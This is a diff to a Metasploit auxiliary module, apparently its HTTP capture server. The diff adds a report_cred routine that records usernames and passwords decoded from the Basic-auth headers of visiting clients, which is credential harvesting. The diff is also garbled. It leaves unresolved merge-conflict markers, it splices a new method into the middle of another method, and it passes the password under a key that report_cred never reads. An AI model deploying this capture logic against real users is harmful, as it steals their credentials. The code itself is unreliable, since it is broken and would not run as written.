@@ -117,8 +117,41 @@ class Metasploit4 < Msf::Auxiliary
     |
   end
 
+
   def process_browser_info(source, cli, request)
     tag = retrieve_tag(cli, request)
+  end
+
+  def report_cred(opts)
+    service_data = {
+      address: opts[:ip],
+      port: opts[:port],
+      service_name: opts[:service_name],
+      protocol: 'tcp',
+      workspace_id: myworkspace_id
+    }
+
+    credential_data = {
+      origin_type: :service,
+      module_fullname: fullname,
+      username: opts[:user],
+      private_data: opts[:password],
+      private_type: :password
+    }.merge(service_data)
+
+    login_data = {
+      core: create_credential(credential_data),
+      status: Metasploit::Model::Login::Status::UNTRIED,
+      proof: opts[:proof]
+    }.merge(service_data)
+
+    create_credential_login(login_data)
+  end
+
+  def dispatch_request(cli, req)
+
+    phost = cli.peerhost
+
 
     browser_profile[tag] ||= {}
     profile = browser_profile[tag]
@@ -244,6 +277,7 @@ class Metasploit4 < Msf::Auxiliary
     if(req['Authorization'] and req['Authorization'] =~ /basic/i)
       basic,auth = req['Authorization'].split(/\s+/)
       user,pass  = Rex::Text.decode_base64(auth).split(':', 2)
+<<<<<<< HEAD
       report_auth_info(
         :host      => peer_addr,
         :port      => self_port,
@@ -252,6 +286,16 @@ class Metasploit4 < Msf::Auxiliary
         :pass      => pass,
         :source_type => "captured",
         :active    => true
+=======
+
+      report_cred(
+        ip: cli.peerhost,
+        port: @myport,
+        service_name: (ssl ? "https" : "http"),
+        user: user,
+        pass: pass,
+        proof: req.resource.to_s
+>>>>>>> master
       )
 
       report_note(
